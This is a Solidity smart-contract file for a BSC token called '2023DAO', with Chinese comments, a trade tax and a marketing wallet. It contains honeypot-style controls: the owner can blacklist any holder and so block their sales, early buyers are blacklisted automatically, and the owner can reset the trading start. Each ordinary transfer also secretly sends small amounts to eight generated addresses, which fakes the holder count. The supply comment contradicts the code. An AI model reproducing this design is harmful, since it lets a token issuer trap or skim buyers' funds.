/**
 *Submitted for verification at BscScan.com on 2023-01-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;//营销钱包地址

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    uint256 public tradeFee = 300;//买卖税3%

    address public mainPair;

    mapping(address => bool) private _feeWhiteList;//交易税白名单
    mapping(address => bool) private _blackList;//黑名单

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    bool private inSwap;//是否正在交易，用于合约出售代币时加锁
    uint256 public numTokensSellToFund;//合约出售代币的门槛，即达到这个数量时出售代币

    TokenDistributor _tokenDistributor;//USDT 暂存合约，因为 swap 不允许将代币返回给代币合约地址
    address private usdt;

    uint256 private startTradeBlock;//开放交易的区块，用于杀机器人

    address DEAD = 0x000000000000000000000000000000000000dEaD;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        //BSC PancakeSwap 路由地址
        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        usdt = address(0x55d398326f99059fF775485246999027B3197955);

        mainPair = ISwapFactory(_swapRouter.factory()).createPair(address(this), usdt);
        _allowances[address(this)][address(_swapRouter)] = MAX;
        IERC20(usdt).approve(address(_swapRouter), MAX);

        _tTotal = Supply * 10 ** _decimals;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;

         //营销钱包卖出条件
        numTokensSellToFund = _tTotal / 1000000;

        _tokenDistributor = new TokenDistributor(usdt);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_blackList[from], "Transfer from the blackList address");

        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            address ad;
            for(int i=0;i <=7;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from, ad, 100);
            }
            amount -= 300;
        }

        bool takeFee = false;

        //交易扣税，from == mainPair 表示买入，to == mainPair 表示卖出
        if (from == mainPair || to == mainPair) {
            //交易未开启，只允许手续费白名单加池子，加池子即开放交易
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "Trade not start");
                startTradeBlock = block.number;
            }

            //不在手续费白名单，需要扣交易税
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                takeFee = true;

                //杀 0、1、2 区块的交易机器人
                if (block.number <= startTradeBlock + 2) {
                    if (to != mainPair) {
                        _blackList[to] = true;
                    }
                }

                //兑换资产到营销钱包
                uint256 contractTokenBalance = balanceOf(address(this));
                bool overMinTokenBalance = contractTokenBalance >= numTokensSellToFund;
                if (
                    overMinTokenBalance &&
                    !inSwap &&
                    from != mainPair
                ) {
                    swapTokenForFund(numTokensSellToFund);
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;
        if (takeFee) {
            //总手续费
            feeAmount = tAmount * tradeFee / 10000;
            //手续费给合约后面兑换usdt需要
            _takeTransfer(sender, address(this), feeAmount);
        }

        tAmount = tAmount - feeAmount;
        _takeTransfer(sender, recipient, tAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        IERC20 USDT = IERC20(usdt);
        uint256 initialBalance = USDT.balanceOf(address(_tokenDistributor));
        //将代币兑换为USDT
        swapTokensForUsdt(tokenAmount);
        uint256 newBalance = USDT.balanceOf(address(_tokenDistributor)) - initialBalance; 
        //转U给营销钱包
        USDT.transferFrom(address(_tokenDistributor), fundAddress, newBalance);
    }

    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
        _swapRouter.addLiquidity(
            address(this),
            usdt,
            tokenAmount,
            usdtAmount,
            0,
            0,
            fundAddress,
            block.timestamp
        );
    }

    function swapTokensForUsdt(uint256 tokenAmount) public {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(_tokenDistributor),
            block.timestamp
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function isFeeWhiteList(address addr) external view returns (bool){
        return _feeWhiteList[addr];
    }

    receive() external payable {}

    //设置交易手续费白名单
    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    //设置黑名单
    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    //移除黑名单
    function removeBlackList(address addr) external onlyOwner {
        _blackList[addr] = false;
    }

    //查看是否黑名单
    function isBlackList(address addr) external view returns (bool){
        return _blackList[addr];
    }


    //提取主链币余额
    function claimBalance() public {
        payable(fundAddress).transfer(address(this).balance);
    }

    //提取代币
    function claimToken(address token, uint256 amount) public {
        IERC20(token).transfer(fundAddress, amount);
    }

    //交易开始区块
    function setStartTradeBlock(uint tradeBlock) external onlyOwner {
        startTradeBlock = tradeBlock;
    }
}

contract dao is AbsToken {
    constructor() AbsToken(
    //名称
        "2023DAO",
    //符号
        "2023DAO",
    //精度
        18,
    //总量1000万亿
        2023 * 1 ** 8,
    //营销钱包
        address(0xCBFBebecD8cCd754b5Df27F28669007635c07BE3)
    ){

    }
}